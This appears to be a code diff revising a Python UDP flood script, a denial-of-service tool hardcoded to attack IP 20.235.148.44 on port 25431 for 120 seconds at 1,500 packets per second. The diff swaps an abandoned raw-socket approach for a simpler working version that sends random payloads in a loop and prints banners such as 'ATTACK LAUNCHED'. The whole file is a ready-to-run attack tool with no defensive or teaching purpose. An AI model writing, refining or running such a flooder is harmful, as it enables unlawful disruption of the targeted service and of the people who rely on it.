@@ -2,79 +2,76 @@ import socket
 import time
 import random
 import threading
-import sys
 import os
+import sys
 
-# CONFIGURATION
-TARGET_IP = "20.235.148.44"
-TARGET_PORT = 25431
-DURATION = 120
-PACKETS_PER_SEC = 2000  # Increase this if your CPU allows it
+# --- CONFIGURATION ---
+TARGET_IP = "20.235.148.44"  # Tera Target IP
+TARGET_PORT = 25431           # Tera Target Port
+DURATION = 120                # Time in Seconds
+PACKETS_PER_SEC = 1500        # Attack Power (Increase if CPU allows)
+# ---------------------
 
 running = True
 
 def clear_screen():
+    # Cross-platform clear command
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def udp_flood_no_scapy():
+def udp_flood():
     global running
     start_time = time.time()
     packets_sent = 0
+    error_count = 0
     
-    # Create a raw socket
-    try:
-        # AF_INET = IPv4, SOCK_RAW = Raw socket access
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
-    except PermissionError:
-        print("[!] Error: You need Administrator privileges to run Raw Sockets.")
-        print("    Right-click your terminal/IDE and select 'Run as Administrator'.")
-        sys.exit(1)
+    print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
+    print(f"⏱️  Duration: {DURATION} seconds")
+    print(f"🚀 Power: {PACKETS_PER_SEC} packets/sec")
+    print("-" * 40)
+    print("🔥 ATTACK LAUNCHED... DO NOT CLOSE WINDOW 🔥")
+    print("-" * 40)
 
-    print(f"[+] Attacking {TARGET_IP}:{TARGET_PORT} for {DURATION} seconds...")
-    print(f"[+] Packets/sec: {PACKETS_PER_SEC}")
-    
     while time.time() - start_time < DURATION:
         if not running:
             break
             
         try:
-            # Create a random payload (dummy data)
-            payload = f"DDOS-{random.randint(1000, 9999)}".encode()
+            # Create a UDP socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             
-            # Construct the UDP header manually isn't strictly necessary for RAW socket
-            # because the kernel does it, but we need to send the packet.
-            # However, in RAW mode, we send the whole packet including IP header.
+            # Generate random payload data (garbage data to fill buffer)
+            payload = random.randbytes(random.randint(100, 1500))
             
-            # Let's just send simple UDP packets using a standard socket first for reliability
-            # If you want RAW speed, stick to Scapy, but this works without it.
+            # Send the packet
+            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
             
-            # Using UDP socket instead of RAW for stability without Scapy
-            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            udp_sock.sendto(payload, (TARGET_IP, TARGET_PORT))
-            udp_sock.close()
-            
+            sock.close()
             packets_sent += 1
             
-            # Rate limiting
+            # Control the rate
             time.sleep(1.0 / PACKETS_PER_SEC)
             
         except Exception as e:
-            pass
+            error_count += 1
+            # Small pause if socket fails
+            time.sleep(0.01)
 
-    print(f"\n[+] Attack Finished.")
-    print(f"[+] Total Packets Sent: {packets_sent}")
+    print("\n" + "="*40)
+    print(f"✅ ATTACK COMPLETED")
+    print(f"📦 Total Packets Sent: {packets_sent}")
+    print(f"❌ Errors Encountered: {error_count}")
+    print("="*40)
 
 def stop_attack():
     global running
     running = False
-    print("\n[-] Attack Stopped.")
 
 if __name__ == "__main__":
     running = True
     clear_screen()
     
-    # Start the attack
     try:
-        udp_flood_no_scapy()
+        udp_flood()
     except KeyboardInterrupt:
         stop_attack()
+        print("\n🛑 User Stopped Attack.")
